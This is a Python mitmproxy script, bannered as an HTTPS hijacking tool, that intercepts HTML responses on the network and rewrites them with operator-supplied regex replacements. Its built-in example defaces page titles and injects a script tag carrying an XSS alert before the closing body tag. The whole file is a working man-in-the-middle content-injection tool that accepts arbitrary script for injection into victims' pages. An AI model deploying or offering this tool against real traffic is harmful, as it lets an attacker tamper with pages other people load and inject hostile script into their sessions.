#!/usr/bin/env python3

import argparse
import os
import re
import signal

from mitmproxy import http

status = 0
matches = None
loads = None

def def_handler(sig, frame):
    print("\n[!] Quitting the program...\n")
    os._exit(1)

signal.signal(signal.SIGINT, def_handler)

def print_banner():
    print("""
█░█ ▀█▀ ▀█▀ █▀█ █▀   █░█ █ ░░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀
█▀█ ░█░ ░█░ █▀▀ ▄█   █▀█ █ █▄█ █▀█ █▄▄ █░█ █ █░▀█ █▄█\n""")

    print("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""")

def set_load(packet, modified_load):
    packet.response.text = modified_load

    return packet

def replacement(packet):
    global matches, loads

    if len(matches) - len(loads) == 0:
        load = packet.response.get_text()
        for i in range(len(matches)):
            modified_load = re.sub(matches[i], loads[i], load)
            if modified_load != load:
                print(f"[+] Visited URL: {packet.request.url}")
                print(f"\t+) Replacing: {matches[i]}  ----->>  {loads[i]}\n")
            packet = set_load(packet, modified_load)
    else:
        print("\n[!] The number of matches and replacements must be equal to perform one-to-one replacements.\n")
        os._exit(1)

    return packet

def verify():
    global matches, loads

    try:
        matches = matches.split('<#>')
        loads = loads.split('<#>')
    except:
        print("\n[!] Incorrect Argument Format.\n")
        os._exit(1)

def response(packet):
    global status, matches, loads
    
    # separator: <#>
    # Matches: <title>.*</title><#></body>
    # Loads: <title>H4cked ;D</title><#></body><script>alert('XSS');</script>

    if status == 0:
        print_banner()
        matches = input('\n[+] Specify the patterns to match in the HTML page, use "<#>" as the separator. (Ex: "<title>.*</title><#></body>)": ')
        loads = input('\n[+] Provide the replacement values to apply when a match is found in the HTML page, use "<#>" as the separator. (Ex: "<title>H4cked ;D</title><#></body><script>alert("XSS");</script>)": ')
        verify()
        print("\n\n\n")
        status = 1
   
    header = packet.response.headers.get("content-type", "")

    if "html" in header:
        packet = replacement(packet)
